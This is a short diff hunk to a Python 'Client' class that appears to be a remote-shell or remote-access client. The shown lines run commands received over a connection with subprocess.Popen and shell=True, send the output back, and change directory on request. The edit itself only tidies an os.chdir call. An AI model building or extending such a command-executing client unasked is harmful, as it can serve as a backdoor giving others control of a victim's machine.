@@ -512,7 +512,7 @@ class Client(object):
                             process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                             self.send(json.dumps(['ERROR', process.stdout.read().decode()]).encode())
                         else:
-                            os.chdir(output.replace('\n', '').replace('\r', ''))
+                            os.chdir(output.strip())
                             self.send(json.dumps([os.getcwd()]).encode())
                     else:
                         self.send(json.dumps(['ERROR', error]).encode())
